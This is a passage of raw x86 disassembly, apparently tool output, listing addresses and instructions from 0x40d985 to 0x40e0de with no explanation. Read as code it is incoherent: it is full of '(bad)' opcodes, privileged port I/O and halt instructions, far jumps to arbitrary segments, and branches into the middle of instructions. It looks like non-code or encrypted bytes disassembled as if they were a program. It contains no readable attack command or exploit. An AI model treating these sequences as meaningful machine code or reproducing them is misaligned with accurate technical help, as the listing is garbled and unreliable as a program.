  40d985:	mov    dh,0xd8
  40d987:	adc    BYTE PTR [ebp+0x5deebf6f],dh
  40d98d:	dec    edi
  40d98e:	hlt    
  40d98f:	dec    eax
  40d990:	xchg   BYTE PTR [edx],ch
  40d992:	pushf  
  40d993:	pop    esi
  40d994:	retf   
  40d995:	fist   DWORD PTR [eax]
  40d997:	xor    edx,0x3d
  40d99a:	lea    esi,[eax+0x49e30c1e]
  40d9a0:	bound  ebp,QWORD PTR [esi]
  40d9a2:	or     ah,bl
  40d9a4:	sub    ch,bl
  40d9a6:	xchg   ebx,eax
  40d9a7:	cld    
  40d9a8:	pop    ss
  40d9a9:	add    al,0x79
  40d9ab:	mov    dl,0x26
  40d9ad:	adc    al,0x42
  40d9af:	pop    es
  40d9b0:	stos   BYTE PTR es:[edi],al
  40d9b1:	or     bh,ah
  40d9b3:	sub    ecx,DWORD PTR [esi]
  40d9b5:	mov    dh,0x72
  40d9b7:	or     ah,BYTE PTR [ebp-0x7b]
  40d9ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9bb:	in     eax,dx
  40d9bc:	aad    0x83
  40d9be:	clc    
  40d9bf:	fisubr WORD PTR [ecx+0x4aa0c2fa]
  40d9c5:	sub    al,0xb4
  40d9c7:	out    dx,eax
  40d9c8:	icebp  
  40d9c9:	sbb    eax,0xe751f287
  40d9ce:	mov    ah,0xef
  40d9d0:	imul   ecx,DWORD PTR [ecx-0x3d5588e4],0x533e849e
  40d9da:	sub    DWORD PTR [ebx+0x3b],ebx
  40d9dd:	mov    ebp,DWORD PTR [ecx]
  40d9df:	mov    edi,0xa59d60c0
  40d9e4:	imul   esp,DWORD PTR [edx+0x2bda65c],0x57bdedb
  40d9ee:	(bad)  
  40d9ef:	push   esp
  40d9f0:	cmp    DWORD PTR [edi+0x4f4446bd],esp
  40d9f6:	jp     0x40da3f
  40d9f8:	ins    BYTE PTR es:[edi],dx
  40d9f9:	dec    edx
  40d9fa:	dec    edx
  40d9fb:	adc    BYTE PTR [ecx-0x6f794cb8],bh
  40da01:	mov    ch,0xa8
  40da03:	mov    esi,DWORD PTR [edi+0x76]
  40da06:	jl     0x40da67
  40da08:	cmc    
  40da09:	gs das 
  40da0b:	mov    ecx,0x4c0c392
  40da10:	loop   0x40d9aa
  40da12:	loop   0x40d9dd
  40da14:	xchg   ebp,eax
  40da15:	es pop es
  40da17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da18:	jmp    0x40d9f9
  40da1a:	dec    ebx
  40da1b:	and    eax,0x523486b9
  40da20:	cs scas al,BYTE PTR es:[edi]
  40da22:	inc    edi
  40da23:	mov    edx,ebp
  40da25:	ret    0xa3b2
  40da28:	(bad)  
  40da29:	dec    edx
  40da2a:	icebp  
  40da2b:	inc    edi
  40da2c:	sbb    ebp,DWORD PTR [ebx-0x40]
  40da2f:	jno    0x40da33
  40da31:	dec    edx
  40da32:	enter  0x50d9,0x86
  40da36:	inc    ecx
  40da37:	adc    eax,0x95bdf5bc
  40da3c:	and    BYTE PTR [edx+0x44],cl
  40da3f:	in     eax,0x58
  40da41:	add    al,BYTE PTR [ebx-0x4570d61d]
  40da47:	or     dl,dl
  40da49:	retf   
  40da4a:	and    DWORD PTR [eax-0x799c4601],esp
  40da50:	xor    dl,BYTE PTR [ebx]
  40da52:	pop    esp
  40da53:	pop    es
  40da54:	inc    esi
  40da55:	adc    DWORD PTR [edi-0x66],0xffffff96
  40da59:	and    al,0xc0
  40da5b:	jmp    0x40da7c
  40da5d:	add    ebx,ecx
  40da5f:	clc    
  40da60:	repnz push es
  40da62:	xor    BYTE PTR [ecx],al
  40da64:	pop    ebp
  40da65:	data16 jbe 0x40d9f3
  40da68:	push   esi
  40da69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da6a:	dec    ecx
  40da6b:	cmp    cl,bh
  40da6d:	mov    eax,ds:0x4fa5e012
  40da72:	jno    0x40da48
  40da74:	pop    ebx
  40da75:	xchg   esi,eax
  40da76:	shr    BYTE PTR [edi],0x1
  40da79:	pusha  
  40da7a:	xchg   ecx,eax
  40da7b:	sbb    cl,ah
  40da7d:	loop   0x40da78
  40da7f:	(bad)  
  40da80:	xchg   edx,eax
  40da81:	call   0xed3b:0x4dffe626
  40da88:	adc    BYTE PTR [ecx],bl
  40da8a:	jnp    0x40da36
  40da8c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da8e:	jbe    0x40da82
  40da90:	mov    al,0x6b
  40da92:	je     0x40da1c
  40da94:	xchg   BYTE PTR [edx-0x61],dl
  40da97:	xor    BYTE PTR [ecx-0x77],cl
  40da9a:	out    dx,eax
  40da9b:	jmp    0x40da26
  40da9d:	fdivr  DWORD PTR ds:0x2b1230a6
  40daa3:	or     DWORD PTR [ebx+0x397c5d7d],0x8bffdbaf
  40daad:	push   eax
  40daae:	sub    al,0x12
  40dab0:	out    0x68,al
  40dab2:	leave  
  40dab3:	es jmp 0xde48a4d4
  40dab9:	mov    ah,0x59
  40dabb:	outs   dx,DWORD PTR ds:[esi]
  40dabc:	test   DWORD PTR [ebp+0x26e9dd46],esi
  40dac2:	out    dx,al
  40dac3:	mov    bh,0x4f
  40dac5:	repnz cmp al,dh
  40dac8:	int    0x4d
  40daca:	push   0xffffffa4
  40dacc:	xlat   BYTE PTR ds:[ebx]
  40dacd:	fistp  WORD PTR [edx-0x20069f08]
  40dad3:	bnd jns 0x40da85
  40dad6:	dec    ecx
  40dad7:	jecxz  0x40db28
  40dad9:	xchg   esi,eax
  40dada:	mov    al,0xe4
  40dadc:	push   ecx
  40dadd:	or     edx,DWORD PTR [ecx+0x64]
  40dae0:	in     al,dx
  40dae1:	sar    dh,0xc9
  40dae4:	inc    esi
  40dae5:	xor    DWORD PTR [ebp+ebp*8+0x25],esp
  40dae9:	rol    BYTE PTR [eax-0x1cc40c27],1
  40daef:	es mov ecx,0x703b1ba3
  40daf5:	jns    0x40db57
  40daf7:	dec    eax
  40daf8:	aad    0xd
  40dafa:	ficom  DWORD PTR [eax+0x327f78fc]
  40db00:	xor    al,0xed
  40db02:	iret   
  40db03:	inc    ebx
  40db04:	ins    BYTE PTR es:[edi],dx
  40db05:	lock dec ebx
  40db07:	push   es
  40db08:	mov    ds:0xedf46b88,al
  40db0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db0e:	or     DWORD PTR [esi-0x50],eax
  40db11:	xor    al,0x87
  40db13:	mov    edx,0x8517eb61
  40db18:	arpl   WORD PTR [edx],bp
  40db1a:	imul   esi,DWORD PTR ds:0x3d0d20bf,0xffffffe1
  40db21:	add    al,0xc4
  40db23:	outs   dx,DWORD PTR ds:[esi]
  40db24:	ins    BYTE PTR es:[edi],dx
  40db25:	push   ss
  40db26:	mov    dh,0x60
  40db28:	iret   
  40db29:	xchg   esp,eax
  40db2a:	dec    ebx
  40db2b:	outs   dx,BYTE PTR ds:[esi]
  40db2c:	loopne 0x40db41
  40db2e:	xchg   edi,eax
  40db2f:	jmp    0xae0e:0x6fa45428
  40db36:	pop    ebp
  40db37:	loopne 0x40dbab
  40db39:	(bad)  
  40db3a:	cli    
  40db3b:	xor    ch,al
  40db3d:	mov    ecx,DWORD PTR ds:0x11d82870
  40db43:	mov    edi,0xb0504bc6
  40db48:	lods   al,BYTE PTR ds:[esi]
  40db49:	sub    ecx,DWORD PTR [ebp-0x2ac2dc78]
  40db4f:	jecxz  0x40db8b
  40db51:	mov    esp,esi
  40db53:	pop    esp
  40db54:	push   ds
  40db55:	mov    ebx,0x7addf4f9
  40db5a:	sub    DWORD PTR [ebp+edi*8-0x770a3bc8],esi
  40db61:	sub    ax,0x88f
  40db65:	dec    esi
  40db66:	lahf   
  40db67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db68:	clc    
  40db69:	jne    0x40dbd5
  40db6b:	pop    eax
  40db6c:	pop    eax
  40db6d:	adc    eax,0xb411dcf8
  40db72:	sbb    bl,BYTE PTR ds:0x4768b6d8
  40db78:	cmp    eax,0x4aca627
  40db7d:	sub    al,BYTE PTR [eax]
  40db7f:	imul   esp,DWORD PTR [edx+0x138ef35c],0xffffffc8
  40db86:	jo     0x40db82
  40db88:	mov    ebp,0x7f29cd21
  40db8d:	or     ebp,DWORD PTR [ebx-0x583626eb]
  40db93:	inc    eax
  40db94:	into   
  40db95:	fsubr  st,st(0)
  40db97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db98:	lods   al,BYTE PTR ds:[esi]
  40db99:	jmp    0x40dbcf
  40db9b:	je     0x40db38
  40db9d:	gs push 0xffffff83
  40dba0:	xchg   ebx,eax
  40dba1:	lods   eax,DWORD PTR ds:[esi]
  40dba2:	sbb    al,0xe0
  40dba4:	test   ah,ch
  40dba6:	pop    ds
  40dba7:	dec    eax
  40dba8:	iret   
  40dba9:	mov    ch,0xcb
  40dbab:	cmp    BYTE PTR [eax-0x4b10b360],al
  40dbb1:	int3   
  40dbb2:	xchg   esp,eax
  40dbb3:	add    BYTE PTR [esi-0x74],bl
  40dbb6:	mov    ch,0xdc
  40dbb8:	js     0x40db6f
  40dbba:	dec    ebp
  40dbbb:	lidtd  [edx+0x71]
  40dbbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbc0:	popa   
  40dbc1:	scas   al,BYTE PTR es:[edi]
  40dbc2:	inc    ecx
  40dbc3:	jg     0x40dba3
  40dbc5:	mov    edi,0x5a07dd67
  40dbca:	jmp    0x7c93a56e
  40dbcf:	dec    ebp
  40dbd0:	inc    esp
  40dbd1:	add    DWORD PTR [edx+0x6],esi
  40dbd4:	mov    DWORD PTR [edi+esi*4-0x5a35fcd8],esi
  40dbdb:	daa    
  40dbdc:	rol    DWORD PTR [eax+ebx*2+0x205d076f],1
  40dbe3:	out    0xfc,al
  40dbe5:	aad    0x9a
  40dbe7:	jmp    0x40dbf5
  40dbe9:	push   ds
  40dbea:	test   eax,0xde4b2a1a
  40dbef:	in     al,0x20
  40dbf1:	adc    ecx,DWORD PTR [eax]
  40dbf3:	inc    ebp
  40dbf4:	push   ebx
  40dbf5:	mov    esi,0xc63ebc7a
  40dbfa:	mov    WORD PTR [edi+0x2f],es
  40dbfd:	and    BYTE PTR [edx],al
  40dbff:	ds or  edx,esi
  40dc02:	lds    edx,FWORD PTR [eax]
  40dc04:	sbb    bh,BYTE PTR [edi]
  40dc06:	fsubr  QWORD PTR [eax-0x67]
  40dc09:	add    ebx,DWORD PTR [edx+eiz*1+0x4dee8658]
  40dc10:	sahf   
  40dc11:	mov    eax,ds:0x6b5d35c9
  40dc16:	pop    ss
  40dc17:	aad    0xd5
  40dc19:	in     al,0x98
  40dc1b:	fcom   DWORD PTR [ebx]
  40dc1d:	xchg   edi,eax
  40dc1e:	in     eax,0x59
  40dc20:	imul   DWORD PTR [edi+eax*2+0x44]
  40dc24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc25:	mov    ecx,0x4b8a7214
  40dc2a:	dec    edx
  40dc2b:	lea    ecx,[ecx+0x38896553]
  40dc31:	in     al,0xb7
  40dc33:	arpl   WORD PTR [esi+0x4dc6bd50],bp
  40dc39:	mov    ah,0x37
  40dc3b:	inc    eax
  40dc3c:	pusha  
  40dc3d:	adc    eax,0xf079dd7f
  40dc42:	push   0xffffffcb
  40dc44:	bound  ebp,QWORD PTR [edx+0x3a0e7817]
  40dc4a:	ror    dh,1
  40dc4c:	mov    al,ds:0x7acd765b
  40dc51:	inc    ebx
  40dc52:	xor    ecx,DWORD PTR [ebx-0x10]
  40dc55:	push   es
  40dc56:	or     DWORD PTR [ecx-0x40f79f96],esi
  40dc5c:	mov    bh,BYTE PTR [esi-0x2f]
  40dc5f:	push   ebp
  40dc60:	pop    eax
  40dc61:	fcom   DWORD PTR [eax]
  40dc63:	mov    eax,ds:0xa351fe18
  40dc68:	jp     0x40dcc8
  40dc6a:	add    eax,0x83029f7e
  40dc6f:	std    
  40dc70:	ss (bad) 
  40dc72:	ret    0x5223
  40dc75:	add    BYTE PTR [esi],0xe4
  40dc78:	mov    cl,0x87
  40dc7a:	add    dl,BYTE PTR [ebx*4+0x3624e9ba]
  40dc81:	mov    ecx,0x422eb860
  40dc86:	push   edx
  40dc87:	sub    bl,bh
  40dc89:	mov    ds:0x95a42da2,al
  40dc8e:	(bad)  
  40dc8f:	(bad)  
  40dc90:	mov    eax,0x24f45132
  40dc95:	lea    edx,[ecx]
  40dc97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc98:	popf   
  40dc99:	out    0xb8,eax
  40dc9b:	mov    esi,0xc72a0869
  40dca0:	add    BYTE PTR [ebx+0x1582bc69],bl
  40dca6:	arpl   WORD PTR [ebp-0x23],di
  40dca9:	scas   al,BYTE PTR es:[edi]
  40dcaa:	mov    dh,0xf2
  40dcac:	stos   BYTE PTR es:[edi],al
  40dcad:	xchg   edi,eax
  40dcae:	jns    0x40dc77
  40dcb0:	mov    esi,0xe80347fb
  40dcb5:	add    DWORD PTR [edi-0x2b],0xbf0cdeca
  40dcbc:	mov    dl,0x53
  40dcbe:	mov    edx,0x4ccd8f22
  40dcc3:	leave  
  40dcc4:	and    al,0xab
  40dcc6:	cmp    BYTE PTR [ebx-0x68af6111],bl
  40dccc:	and    BYTE PTR [ecx],bl
  40dcce:	mov    eax,0x9488576c
  40dcd3:	leave  
  40dcd4:	(bad)  
  40dcd6:	call   0x6846:0xc31dd142
  40dcdd:	xchg   ebx,eax
  40dcde:	loop   0x40dc87
  40dce0:	ins    DWORD PTR es:[edi],dx
  40dce1:	inc    ebx
  40dce2:	loope  0x40dd5b
  40dce4:	and    al,0xe0
  40dce6:	sub    eax,0x529971da
  40dceb:	and    al,0xea
  40dced:	push   ss
  40dcee:	les    edx,FWORD PTR [esi-0xe]
  40dcf1:	(bad)  
  40dcf2:	in     eax,dx
  40dcf3:	cmp    al,0x50
  40dcf5:	mov    bh,0x3e
  40dcf7:	in     al,dx
  40dcf8:	loope  0x40dce1
  40dcfa:	aas    
  40dcfb:	repz cwde 
  40dcfd:	jge    0x40dd0e
  40dcff:	dec    ebx
  40dd00:	nop
  40dd01:	or     DWORD PTR [ebx-0x4],ecx
  40dd04:	pop    es
  40dd05:	pop    esp
  40dd06:	(bad)  [ecx+edx*1]
  40dd09:	pop    esi
  40dd0a:	(bad)  
  40dd0b:	pop    esp
  40dd0c:	pop    ss
  40dd0d:	rcl    DWORD PTR [esp+esi*4+0x5b815112],0x9c
  40dd15:	xor    BYTE PTR [edx-0x5f],dh
  40dd18:	adc    ah,BYTE PTR ss:[edi+ebx*1-0x42]
  40dd1d:	cmp    eax,0x89009146
  40dd22:	inc    eax
  40dd23:	test   al,0xaa
  40dd25:	pop    ds
  40dd26:	imul   edi,DWORD PTR [ecx],0x1f
  40dd29:	pop    ebp
  40dd2a:	dec    edi
  40dd2b:	jle    0x40dcc1
  40dd2d:	cmc    
  40dd2e:	xchg   edi,eax
  40dd2f:	arpl   WORD PTR [ebx],ax
  40dd31:	adc    BYTE PTR [ecx],0x1
  40dd34:	jl     0x40dcc7
  40dd36:	pop    eax
  40dd37:	pop    eax
  40dd38:	inc    eax
  40dd39:	push   ecx
  40dd3a:	in     eax,dx
  40dd3b:	push   cs
  40dd3c:	jl     0x40dcc0
  40dd3e:	rol    BYTE PTR [edi],1
  40dd40:	cwde   
  40dd41:	imul   esi,DWORD PTR [esi+0x53],0x1e965338
  40dd48:	mov    edx,0x86f24a4c
  40dd4d:	push   ds
  40dd4e:	push   edi
  40dd4f:	mov    edi,0xef2d0079
  40dd54:	cld    
  40dd55:	jle    0x40dd7e
  40dd57:	pop    ds
  40dd58:	jae    0x40dd67
  40dd5a:	cmp    al,0x88
  40dd5c:	xchg   ah,ch
  40dd5e:	and    ch,dh
  40dd60:	jnp    0x40ddcf
  40dd62:	stos   BYTE PTR es:[edi],al
  40dd63:	mov    dl,BYTE PTR [ecx+ecx*4]
  40dd66:	sub    al,0xf7
  40dd68:	pop    edi
  40dd69:	mov    edx,0x6383f7e4
  40dd6e:	aam    0x72
  40dd70:	pop    esi
  40dd71:	cmp    esi,DWORD PTR [edx-0x226d0152]
  40dd77:	ret    0x70c8
  40dd7a:	xlat   BYTE PTR ds:[ebx]
  40dd7b:	test   DWORD PTR [ecx+edi*8],esp
  40dd7e:	jp     0x40dd90
  40dd80:	out    0xe1,eax
  40dd82:	mov    cs,WORD PTR [ebp-0x5f]
  40dd85:	jns    0x40dd4d
  40dd87:	dec    edi
  40dd88:	out    0xd5,eax
  40dd8a:	sbb    BYTE PTR ss:0x535b4d44,dl
  40dd91:	mov    esp,0x5623a64e
  40dd96:	cwde   
  40dd97:	xlat   BYTE PTR ds:[ebx]
  40dd98:	fwait
  40dd99:	aad    0xdf
  40dd9b:	sbb    dh,al
  40dd9d:	add    al,BYTE PTR [edi-0x2dacf4d4]
  40dda3:	sbb    bl,BYTE PTR [eax]
  40dda5:	stos   DWORD PTR es:[edi],eax
  40dda6:	(bad)  
  40dda7:	into   
  40dda8:	and    al,0x76
  40ddaa:	lods   al,BYTE PTR ds:[esi]
  40ddab:	repz jg 0x40de0e
  40ddae:	pop    ebp
  40ddaf:	sub    BYTE PTR [ebx-0x775f9209],ch
  40ddb5:	jae    0x40dd9f
  40ddb7:	push   ss
  40ddb8:	fld    QWORD PTR [edi-0x27]
  40ddbb:	or     al,0x16
  40ddbd:	sahf   
  40ddbe:	fiadd  WORD PTR [ebx+0x53]
  40ddc1:	inc    ecx
  40ddc2:	xor    DWORD PTR [ecx+ebp*2-0x516e1da0],edx
  40ddc9:	outs   dx,BYTE PTR ds:[esi]
  40ddca:	cmp    al,BYTE PTR [ecx+0x1f]
  40ddcd:	loopne 0x40dd92
  40ddcf:	dec    esp
  40ddd0:	inc    ebp
  40ddd1:	cmp    ecx,edi
  40ddd3:	adc    BYTE PTR [ecx],dl
  40ddd5:	xchg   esp,eax
  40ddd6:	pop    edx
  40ddd7:	fst    QWORD PTR [ebx-0x51303dab]
  40dddd:	and    eax,esi
  40dddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dde0:	push   es
  40dde1:	ror    ah,0xe2
  40dde4:	mov    bl,0x63
  40dde6:	pop    ds
  40dde7:	arpl   WORD PTR [edi],cx
  40dde9:	mov    ds:0x16fe9aa8,al
  40ddee:	pop    eax
  40ddef:	test   al,0x56
  40ddf1:	push   ss
  40ddf2:	xlat   BYTE PTR ds:[ebx]
  40ddf3:	ss jp  0x40de53
  40ddf6:	mov    DWORD PTR [esi-0x78fc4514],ebp
  40ddfc:	shl    DWORD PTR [edi+ebx*1+0x11dccda1],cl
  40de03:	inc    edx
  40de04:	js     0x40de4b
  40de06:	or     al,0x93
  40de08:	clc    
  40de09:	xchg   edi,eax
  40de0a:	inc    esp
  40de0b:	xchg   esi,eax
  40de0c:	sbb    al,0x31
  40de0e:	cdq    
  40de0f:	fs mov al,fs:0x3ce958d9
  40de16:	inc    ebp
  40de17:	pop    esi
  40de18:	(bad)  
  40de19:	mov    ecx,0xef94778a
  40de1e:	imul   ebp,eax,0x9b46e91e
  40de24:	pop    esp
  40de25:	mov    WORD PTR [ebx],fs
  40de27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de28:	lea    ebp,[ebx]
  40de2a:	xchg   DWORD PTR [eax+0x50e655a6],esp
  40de30:	xchg   esi,eax
  40de31:	(bad)  
  40de32:	int3   
  40de33:	inc    edi
  40de34:	lods   al,BYTE PTR ds:[esi]
  40de35:	pusha  
  40de36:	ja     0x40de9a
  40de38:	jp     0x40de06
  40de3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de3b:	repnz (bad) 
  40de3d:	cmp    al,0xb5
  40de3f:	push   es
  40de40:	mov    ecx,0x536de3fe
  40de45:	jmp    0xd29a:0x80578427
  40de4c:	sub    BYTE PTR [esi+0x77],al
  40de4f:	xchg   ebx,eax
  40de50:	test   BYTE PTR [edx],dl
  40de52:	pop    eax
  40de53:	mov    edx,DWORD PTR [esi+0x45d8e2ba]
  40de59:	push   cs
  40de5a:	cli    
  40de5b:	mov    dh,BYTE PTR [ebx+0x5d2356f3]
  40de61:	adc    al,0x8a
  40de63:	lock mov esp,0xdda8eec3
  40de69:	mov    ds:0x145ba3f1,eax
  40de6e:	into   
  40de6f:	dec    ebx
  40de70:	jg     0x40de4c
  40de72:	or     ax,0xeb4d
  40de76:	dec    edi
  40de77:	jmp    0xcb2eac40
  40de7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de7d:	rcl    BYTE PTR [edi-0x1e],cl
  40de80:	aas    
  40de81:	inc    esp
  40de82:	xor    al,0xe4
  40de84:	pushf  
  40de85:	call   0x4d8c:0x74f7cb4c
  40de8c:	ret    
  40de8d:	pusha  
  40de8e:	push   0x2095d4e0
  40de93:	push   ss
  40de94:	xor    eax,0x385e2875
  40de99:	mov    fs,esi
  40de9b:	popf   
  40de9c:	(bad)  
  40de9e:	imul   ebp,DWORD PTR [edx+edi*4-0x1b],0x4c
  40dea3:	jbe    0x40df1c
  40dea5:	pop    esp
  40dea6:	jo     0x40def4
  40dea8:	inc    esp
  40dea9:	cli    
  40deaa:	addr16 aas 
  40deac:	shl    DWORD PTR [ebx],cl
  40deae:	ror    DWORD PTR [edx-0x51],cl
  40deb1:	pop    esp
  40deb2:	push   esp
  40deb3:	pop    esp
  40deb4:	lea    ebp,[edx]
  40deb6:	cmc    
  40deb7:	gs inc eax
  40deb9:	call   0x7539:0xa4486d59
  40dec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dec1:	inc    edi
  40dec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dec3:	daa    
  40dec4:	dec    esp
  40dec5:	mov    bh,0x80
  40dec7:	test   DWORD PTR [ecx+0x2e564933],ebx
  40decd:	in     eax,dx
  40dece:	aam    0x78
  40ded0:	and    eax,0x6d01446d
  40ded5:	jle    0x40de6b
  40ded7:	idiv   bh
  40ded9:	repz add BYTE PTR [eax],al
  40dedc:	mov    BYTE PTR [ebx],ah
  40dede:	rol    DWORD PTR [eax+0x3d],1
  40dee1:	mov    ebp,0xcd8564be
  40dee6:	push   ebx
  40dee7:	xchg   edx,eax
  40dee8:	(bad)  
  40dee9:	shl    BYTE PTR [esi],1
  40deeb:	xor    BYTE PTR [eax],dl
  40deed:	push   eax
  40deee:	sub    BYTE PTR [esi+0x7a],ah
  40def1:	scas   al,BYTE PTR es:[edi]
  40def2:	scas   al,BYTE PTR es:[edi]
  40def3:	push   eax
  40def4:	pop    ss
  40def5:	xchg   esi,eax
  40def6:	sar    ah,0x42
  40def9:	inc    edi
  40defa:	mov    bh,0xa8
  40defc:	in     eax,0x96
  40defe:	pop    ecx
  40deff:	nop
  40df00:	adc    ecx,DWORD PTR [ecx+ebp*2]
  40df03:	into   
  40df04:	enter  0x7e8f,0x3e
  40df08:	inc    ebp
  40df09:	mov    ebp,0xdbd2704c
  40df0e:	jecxz  0x40deff
  40df10:	jae    0x40dea7
  40df12:	jmp    0x40df43
  40df14:	scas   eax,DWORD PTR es:[edi]
  40df15:	cmp    ah,dl
  40df17:	sbb    eax,0x4c745087
  40df1c:	sti    
  40df1d:	pop    esp
  40df1e:	(bad)  
  40df20:	dec    edi
  40df21:	fnstsw WORD PTR [edi]
  40df23:	in     eax,0x43
  40df25:	cs sti 
  40df27:	push   cs
  40df28:	js     0x40df07
  40df2a:	bound  edi,QWORD PTR [eax-0x5d]
  40df2d:	lock jo 0x40df3d
  40df30:	test   BYTE PTR [edi],ch
  40df32:	jo     0x40df2f
  40df34:	xchg   esp,eax
  40df35:	sbb    DWORD PTR [esi],0x37083fd1
  40df3b:	mov    al,0x8b
  40df3d:	lock push ds
  40df3f:	and    eax,0x2993350
  40df44:	icebp  
  40df45:	adc    edi,DWORD PTR [eax+0x10]
  40df48:	outs   dx,DWORD PTR ds:[esi]
  40df49:	out    0xdd,eax
  40df4b:	inc    ebx
  40df4c:	imul   ecx,ebx,0x11988a2d
  40df52:	or     al,0x0
  40df54:	push   ss
  40df55:	mov    ds:0xc5f67e6a,al
  40df5a:	sbb    ecx,esp
  40df5c:	shl    ah,0xcd
  40df5f:	cdq    
  40df60:	inc    edi
  40df61:	fisubr WORD PTR [ebx-0xee0c67a]
  40df67:	mov    bl,0x41
  40df69:	dec    esi
  40df6a:	or     eax,0x54ffd847
  40df6f:	mov    edi,0xeb2ebf87
  40df75:	jbe    0x40df49
  40df77:	lea    ebx,[ebx-0x315746a2]
  40df7d:	mov    eax,ds:0x57c92989
  40df82:	das    
  40df83:	fmul   QWORD PTR [edi-0xdd74236]
  40df89:	rcl    cl,0x60
  40df8c:	cmp    eax,0xdb58a418
  40df91:	test   al,0x66
  40df93:	(bad)  
  40df94:	cmp    edi,DWORD PTR [edx]
  40df96:	lock js 0x40dfa1
  40df99:	test   DWORD PTR [ecx-0x55],edx
  40df9c:	inc    ecx
  40df9d:	dec    esi
  40df9e:	pop    ecx
  40df9f:	stos   BYTE PTR es:[edi],al
  40dfa0:	std    
  40dfa1:	sub    ch,BYTE PTR [ebx+0x7c]
  40dfa4:	adc    al,0x43
  40dfa6:	out    dx,eax
  40dfa7:	ret    
  40dfa8:	push   esp
  40dfa9:	or     BYTE PTR [edi-0x80],ah
  40dfac:	push   0x1a03d8e0
  40dfb1:	clc    
  40dfb2:	lahf   
  40dfb3:	mov    al,ds:0x89f13acb
  40dfb8:	sahf   
  40dfb9:	mov    gs,WORD PTR [edi+0x7]
  40dfbc:	xchg   edx,eax
  40dfbd:	jl     0x40dfc6
  40dfbf:	inc    edi
  40dfc0:	pop    ds
  40dfc1:	inc    ebx
  40dfc2:	cs (bad) 
  40dfc5:	push   ebp
  40dfc6:	xor    eax,0x51e99b30
  40dfcb:	jb     0x40dfae
  40dfcd:	add    esp,DWORD PTR [esi+0x77]
  40dfd0:	inc    ebp
  40dfd1:	pop    eax
  40dfd2:	shl    BYTE PTR ds:0x41ba9a37,0xd3
  40dfd9:	ss imul edi,esp,0x90e84cdb
  40dfe0:	adc    BYTE PTR [ebp+0xe1b282],ah
  40dfe6:	out    dx,al
  40dfe7:	xor    DWORD PTR [edx+esi*4-0x4a],edi
  40dfeb:	sub    al,bl
  40dfed:	(bad)  
  40dfef:	in     eax,dx
  40dff0:	dec    ebp
  40dff1:	repz loopne 0x40e065
  40dff4:	in     al,dx
  40dff5:	aaa    
  40dff6:	or     DWORD PTR [esi-0x99b77e8],0x75fa6e85
  40e000:	imul   ecx,edx,0xed8b48ff
  40e006:	cmp    edi,DWORD PTR [edx]
  40e008:	outs   dx,DWORD PTR ds:[esi]
  40e009:	shl    BYTE PTR [ebx+0xd65df07],1
  40e00f:	shr    esi,1
  40e011:	cmp    dh,BYTE PTR [esi-0x60]
  40e014:	out    0xc,eax
  40e016:	mov    ecx,0x14cde9c8
  40e01b:	jno    0x40dfb8
  40e01d:	cld    
  40e01e:	xchg   ch,cl
  40e020:	add    BYTE PTR [ebx-0x48912415],0x78
  40e027:	jnp    0x40dfe3
  40e029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e02a:	mov    dh,0xc3
  40e02c:	add    eax,0x482b0dcd
  40e031:	mov    dh,0x7d
  40e033:	jecxz  0x40e00f
  40e035:	push   ebp
  40e036:	iret   
  40e037:	in     eax,dx
  40e038:	sar    BYTE PTR [eax+edx*8+0x132c5612],cl
  40e03f:	cs push 0xf77015f4
  40e045:	push   ecx
  40e046:	repz aad 0x90
  40e049:	push   ecx
  40e04a:	aam    0xf1
  40e04c:	sbb    al,0x87
  40e04e:	mov    eax,DWORD PTR [edx-0x542bdca9]
  40e054:	or     ah,ch
  40e056:	sub    al,0xef
  40e058:	jae    0x40e01f
  40e05a:	scas   al,BYTE PTR es:[edi]
  40e05b:	dec    esi
  40e05c:	pop    eax
  40e05d:	push   ebx
  40e05e:	push   ebp
  40e05f:	add    BYTE PTR [ebp-0x54],al
  40e062:	mov    eax,ds:0x99ef4442
  40e067:	(bad)  
  40e068:	cmp    al,bh
  40e06a:	test   BYTE PTR [ebp-0x2be6f830],cl
  40e070:	sub    DWORD PTR [ecx+esi*4+0x7dee919b],0x24
  40e078:	mov    eax,0xf52c0959
  40e07d:	xchg   DWORD PTR [edi+0x20ff33ba],eax
  40e083:	les    edi,FWORD PTR [edx]
  40e085:	in     eax,0x80
  40e087:	xor    ah,BYTE PTR [edx]
  40e089:	shl    dh,cl
  40e08b:	fs sti 
  40e08d:	scas   al,BYTE PTR es:[edi]
  40e08e:	repz pop eax
  40e090:	shl    DWORD PTR [ebx-0x39f0315c],cl
  40e096:	xor    bl,BYTE PTR [ecx+esi*1+0x1b]
  40e09a:	push   esi
  40e09b:	jge    0x40e119
  40e09d:	in     al,dx
  40e09e:	mov    ebx,0xc0797dd
  40e0a3:	add    ax,di
  40e0a6:	and    al,0xf
  40e0a8:	add    eax,0xa9e359dd
  40e0ad:	mov    ecx,0xc914dddb
  40e0b2:	fistp  DWORD PTR ds:0x77866a33
  40e0b8:	jmp    0x638c8fb0
  40e0bd:	mov    ebx,0x67acf6ed
  40e0c2:	or     esi,DWORD PTR [ebp-0x61]
  40e0c5:	mov    al,ds:0x4e0b4200
  40e0ca:	add    al,0x4d
  40e0cc:	inc    ebx
  40e0cd:	cmc    
  40e0ce:	das    
  40e0cf:	aaa    
  40e0d0:	cmp    BYTE PTR [esi-0x27e9d12a],cl
  40e0d6:	les    edx,FWORD PTR [ebp+0x6c]
  40e0d9:	sub    DWORD PTR [edi],0x1c
  40e0dc:	jb     0x40e0b9
  40e0de:	add    ecx,DWORD PTR [edi+0x7e97fd88]
